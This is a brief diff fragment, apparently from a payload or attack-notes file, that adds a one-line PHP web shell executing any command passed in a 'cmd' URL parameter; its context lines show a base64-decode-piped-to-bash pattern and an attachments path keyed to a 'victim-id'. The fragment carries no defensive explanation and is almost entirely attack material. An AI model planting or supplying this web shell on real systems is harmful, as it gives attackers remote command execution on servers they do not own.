@@ -22,3 +22,5 @@ echo ... | base64 -d | bash
 /{victim-id}/activity/attachments/
 
 
+php:
+<?php system($_GET['cmd']); ?>
